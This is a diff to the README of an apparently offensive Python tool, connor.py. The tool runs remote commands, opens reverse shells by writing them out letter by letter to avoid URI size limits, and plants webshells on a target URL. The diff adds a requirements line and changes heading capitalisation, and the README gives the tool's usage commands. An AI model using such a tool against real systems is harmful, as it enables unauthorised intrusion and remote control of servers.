@@ -5,6 +5,9 @@
 - Avoids webservers URI size limitation by writting the reverse shell letter by letter
 - Includes extra features for webshell & RCE
 
+# Requirements
+`pip3 install requests`
+
 ## Usage
 `python3 connor.py help`
 
@@ -12,11 +15,11 @@
 
 `python3 connor.py rce <TARGET-URL> <COMMAND>`
 
-**REVERSE SHELL**
+**Reverse Shell**
 
 `python3 connor.py shell <TARGET-URL> <IP> <PORT>`
 
-**WEBSHELL** 
+**Webshell** 
 
 `python3 connor.py web <TARGET-URL> <IP> <PORT>`
 
